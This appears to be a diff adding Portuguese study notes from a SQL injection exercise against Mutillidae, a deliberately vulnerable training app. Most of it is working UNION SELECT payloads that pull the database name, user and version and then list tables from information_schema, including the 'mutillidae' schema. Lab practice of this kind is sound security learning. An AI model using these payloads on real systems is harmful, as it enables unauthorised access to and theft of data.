@@ -1,0 +1,12 @@
+Sabemos que as colunas 2,3,4 é as que estão sendo mostradas, com isso, vamos realizar a substituição.
+admin' UNION SELECT 1,database(),user(),version(),5,6,7#
+
+Pegando as tabelas do banco de dados:
+
+Sabemos que as colunas 2,3,4 é as que estão sendo mostradas, com isso, vamos realizar a substituição.
+
+FAZENDO SELECT PARA TODOS OS BANCOS DE DADOS
+admin' UNION SELECT 1,table_name,table_schema,4,5,6,7 FROM information_schema.tables#
+
+PEGANDO O BANCO DE DADOS MUTILLIDAE
+admin' UNION SELECT 1,table_name,table_schema,4,5,6,7 FROM information_schema.tables WHERE table_schema="mutillidae"#
